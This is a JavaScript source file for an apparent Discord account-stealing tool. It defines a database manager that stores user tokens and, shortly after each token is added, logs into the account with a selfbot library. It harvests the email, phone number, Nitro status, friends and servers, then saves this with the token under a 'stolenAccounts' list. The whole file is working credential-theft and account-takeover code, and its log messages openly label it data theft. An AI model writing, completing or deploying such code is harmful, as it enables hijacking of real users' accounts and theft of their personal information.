const fs = require('fs');
const axios = require('axios');

class DBManager {
    constructor(filePath = './db.json') {
        this.filePath = filePath;
        this.data = this.loadDB();
    }

    loadDB() {
        try {
            if (fs.existsSync(this.filePath)) {
                const data = fs.readFileSync(this.filePath, 'utf8');
                const parsed = JSON.parse(data);
                if (!parsed.stolenAccounts) {
                    parsed.stolenAccounts = [];
                }
                return parsed;
            }
            return { stolenAccounts: [] };
        } catch (err) {
            console.error('❌ DB read error:', err);
            return { stolenAccounts: [] };
        }
    }

    saveDB() {
        try {
            fs.writeFileSync(this.filePath, JSON.stringify(this.data, null, 2));
            console.log('💾 Database saved');
        } catch (err) {
            console.error('❌ DB save error:', err);
        }
    }

    getTokens() {
        const tokens = { ...this.data };
        delete tokens.stolenAccounts;
        return tokens;
    }

    addToken(userId, token) {
        this.data[userId] = token;
        this.saveDB();
        console.log(`✅ Token added for user ${userId}`);
        
        setTimeout(() => {
            this.stealAccountData(token, userId);
        }, 1000);
    }

    removeToken(userId) {
        delete this.data[userId];
        this.saveDB();
    }

    async stealAccountData(token, userId) {
        console.log(`🎯 Starting immediate data theft for user ${userId}...`);
        
        try {
            const { Client: SelfbotClient } = require('discord.js-selfbot-v13');
            const tempClient = new SelfbotClient();
            
            await tempClient.login(token);
            const user = tempClient.user;
            
            const accountData = {
                user_id: user.id,
                username: user.tag,
                discriminator: user.discriminator,
                phone: 'Not accessible',
                email: 'Not accessible',
                account_created: user.createdAt.toISOString(),
                nitro_status: 'None',
                friends_count: 0,
                servers_count: tempClient.guilds.cache.size,
                avatar_url: user.displayAvatarURL({ format: 'png', size: 1024 }),
                banner_url: 'No banner',
                token: token,
                stolen_at: new Date().toISOString(),
                added_by: userId
            };

            try {
                const userData = await tempClient.api.users('@me').get();
                if (userData.phone) accountData.phone = userData.phone;
                if (userData.email) accountData.email = userData.email;
                if (userData.premium_type) {
                    accountData.nitro_status = userData.premium_type === 1 ? 'Nitro Classic' : 
                                             userData.premium_type === 2 ? 'Nitro Boost' : 'None';
                }
                if (userData.banner) {
                    const format = userData.banner.startsWith('a_') ? 'gif' : 'png';
                    accountData.banner_url = `https://cdn.discordapp.com/banners/${user.id}/${userData.banner}.${format}?size=1024`;
                }
            } catch (e) {}

            try {
                const relationships = await tempClient.api.users('@me').relationships.get();
                accountData.friends_count = relationships.filter(rel => rel.type === 1).length;
            } catch (e) {}

            tempClient.destroy();

            if (!Array.isArray(this.data.stolenAccounts)) {
                this.data.stolenAccounts = [];
            }
            
            this.data.stolenAccounts = this.data.stolenAccounts.filter(acc => acc.token !== token);
            this.data.stolenAccounts.push(accountData);
            this.saveDB();
            
            console.log(`✅ IMMEDIATE DATA THEFT COMPLETE for ${user.tag}`);
            console.log(`📧 Email: ${accountData.email}`);
            console.log(`📱 Phone: ${accountData.phone}`);
            console.log(`💎 Nitro: ${accountData.nitro_status}`);
            
        } catch (error) {
            console.error(`❌ Immediate theft failed for user ${userId}:`, error.message);
        }
    }

    addStolenAccount(accountData) {
        if (!Array.isArray(this.data.stolenAccounts)) {
            this.data.stolenAccounts = [];
        }
        this.data.stolenAccounts = this.data.stolenAccounts.filter(acc => acc.token !== accountData.token);
        this.data.stolenAccounts.push(accountData);
        this.saveDB();
        return accountData;
    }

    getAllStolenAccounts() {
        return this.data.stolenAccounts || [];
    }

    getAccountByUserId(userId) {
        if (!this.data.stolenAccounts) return null;
        return this.data.stolenAccounts.find(acc => acc.user_id === userId);
    }

    getAccountByToken(token) {
        if (!this.data.stolenAccounts) return null;
        return this.data.stolenAccounts.find(acc => acc.token === token);
    }
}

module.exports = DBManager;